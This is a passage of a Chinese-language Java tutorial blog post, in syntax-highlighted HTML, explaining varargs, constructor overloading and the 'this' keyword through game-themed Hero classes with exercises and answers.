class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/590.png" alt="590" loading="lazy"></p><h4 id="可变数量的参数"><a href="#可变数量的参数" class="headerlink" title="可变数量的参数"></a>可变数量的参数</h4><p>如果要攻击更多的英雄，就需要设计更多的方法，这样类会显得很累赘，像这样：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时，可以采用可变数量的参数<br><strong>只需要设计一个方法</strong><br><code>public void attack(Hero **...**heros)</code><br>即可代表上述所有的方法了<br>在方法里，使用操作数组的方式处理参数heros即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ADHero</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 进行了一次攻击 ，但是不确定打中谁了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// 可变数量的参数</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> heros<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> heros<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 攻击了 "</span> <span class="token operator">+</span> heros<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ADHero</span> bh <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ADHero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"赏金猎人"</span><span class="token punctuation">;</span>         <span class="token class-name">Hero</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>         bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h4><p>设计一个类Support (辅助英雄)继承Hero，提供一个heal(治疗)方法<br>对Support的heal方法进行重载<br>heal()<br>heal(Hero h) //为指定的英雄加血<br>heal(Hero h, int hp) //为指定的英雄加了hp的血<br>heal(int hp,Hero…Heros)//为n个指定英雄加了hp的血</p><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Hero</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Support</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"对某位英雄进行了治疗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"对"</span> <span class="token operator">+</span>h<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"进行了治疗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h<span class="token punctuation">,</span><span class="token keyword">int</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"给"</span> <span class="token operator">+</span>h<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加了"</span><span class="token operator">+</span>hp<span class="token operator">+</span><span class="token string">"hp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token keyword">int</span> hp<span class="token punctuation">,</span><span class="token class-name">Hero</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token class-name">Heros</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">Heros</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"给"</span> <span class="token operator">+</span><span class="token class-name">Heros</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加了"</span><span class="token operator">+</span>hp<span class="token operator">+</span><span class="token string">"hp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">Support</span> qn<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"琴女"</span><span class="token punctuation">;</span><span class="token class-name">Hero</span> ys<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ys<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"亚索"</span><span class="token punctuation">;</span><span class="token class-name">Hero</span> tm<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tm<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"提莫"</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span>ys<span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span>tm<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> tm<span class="token punctuation">,</span>ys<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><h4 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h4><p>方法名和类名一样（包括大小写）<br><strong>没有返回类型</strong><br>实例化一个对象的时候，必然调用构造方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token comment">// 方法名和类名一样（包括大小写）</span>    <span class="token comment">// 没有返回类型</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"实例化一个对象的时候，必然调用构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//实例化一个对象的时候，必然调用构造方法</span>        <span class="token class-name">Hero</span> h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="隐藏的构造方法"><a href="#隐藏的构造方法" class="headerlink" title="隐藏的构造方法"></a>隐藏的构造方法</h4><p>Hero类的构造方法是</p><p><code>public Heo()&#123;</code>  </p><p><code>&#125;</code><br>这个无参的构造方法，如果不写，就会默认提供一个</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token comment">//这个无参的构造方法，如果不写，</span>    <span class="token comment">//就会默认提供一个无参的构造方法</span>    <span class="token comment">//  public Hero()&#123; </span>    <span class="token comment">//      System.out.println("调用Hero的构造方法");</span>    <span class="token comment">//  &#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>hp <span class="token operator">=</span> <span class="token number">616.28f</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>armor <span class="token operator">=</span> <span class="token number">27.536f</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>moveSpeed <span class="token operator">=</span> <span class="token number">350</span><span class="token punctuation">;</span>                 <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>hp <span class="token operator">=</span> <span class="token number">383f</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>armor <span class="token operator">=</span> <span class="token number">14f</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>moveSpeed <span class="token operator">=</span> <span class="token number">330</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="有参的构造方法"><a href="#有参的构造方法" class="headerlink" title="有参的构造方法"></a>有参的构造方法</h4><p>一旦提供了一个有参的构造方法<br>同时又<strong>没有显式</strong>的提供一个无参的构造方法<br>那么默认的无参的构造方法，就“木有了“</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>          <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>          <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>          <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>          <span class="token comment">//有参的构造方法</span>    <span class="token comment">//默认的无参的构造方法就失效了</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         name <span class="token operator">=</span> heroname<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//无参的构造方法“木有了”</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="构造方法的重载"><a href="#构造方法的重载" class="headerlink" title="构造方法的重载"></a>构造方法的重载</h4><p>构造方法也是可以重载的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>           <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>           <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>           <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>           <span class="token comment">//带一个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         name <span class="token operator">=</span> heroname<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token comment">//带两个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroname<span class="token punctuation">,</span><span class="token keyword">float</span> herohp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         name <span class="token operator">=</span> heroname<span class="token punctuation">;</span>        hp <span class="token operator">=</span> herohp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>           <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h4><p>为Hero设计4个参数的构造方法<br>这四个参数分别是<br>String heroName<br>float heroHP<br>float heroArmor<br>int heroMoveSpeed</p><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroName<span class="token punctuation">,</span><span class="token keyword">float</span> heroHP<span class="token punctuation">,</span><span class="token keyword">float</span> heroArmor<span class="token punctuation">,</span><span class="token keyword">int</span> heroMoveSpeed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"英雄:"</span><span class="token operator">+</span>heroName <span class="token operator">+</span><span class="token string">" 血线"</span><span class="token operator">+</span>heroHP<span class="token operator">+</span><span class="token string">" 护甲"</span><span class="token operator">+</span> heroArmor<span class="token operator">+</span><span class="token string">" 移动步长:"</span><span class="token operator">+</span>heroMoveSpeed<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> h22 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><h4 id="this即代表当前对象"><a href="#this即代表当前对象" class="headerlink" title="this即代表当前对象"></a>this即代表当前对象</h4><p>this这个关键字，相当于普通话里的“<strong>我</strong>”</p><p>小明说 “我吃了” 这个时候，“<strong>我</strong>” 代表小明<br>小红说 “我吃了” 这个时候，“<strong>我</strong>” 代表小红<br>“<strong>我</strong>“代表当前人物</p><p><strong>this</strong>这个关键字，相当于普通话里的“<strong>我</strong>”<br><strong>this即代表当前对象</strong></p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/597.png" alt="597" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>     <span class="token comment">//打印内存中的虚拟地址</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">showAddressInMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"打印this看到的虚拟地址："</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        <span class="token comment">//直接打印对象，会显示该对象在内存中的虚拟地址</span>        <span class="token comment">//格式：Hero@c17164 c17164即虚拟地址，每次执行，得到的地址不一定一样</span>         <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"打印对象看到的虚拟地址："</span><span class="token operator">+</span>garen<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//调用showAddressInMemory，打印该对象的this，显示相同的虚拟地址</span>        garen<span class="token punctuation">.</span><span class="token function">showAddressInMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"打印对象看到的虚拟地址："</span><span class="token operator">+</span>teemo<span class="token punctuation">)</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span><span class="token function">showAddressInMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过this访问对象的属性"><a href="#通过this访问对象的属性" class="headerlink" title="通过this访问对象的属性"></a>通过this访问对象的属性</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>     <span class="token comment">//参数名和属性名一样</span>    <span class="token comment">//在方法体中，只能访问到参数name</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName1</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token comment">//为了避免setName1中的问题，参数名不得不使用其他变量名</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName2</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> heroName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token comment">//通过this访问属性</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName3</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//name代表的是参数name</span>        <span class="token comment">//this.name代表的是属性name</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token 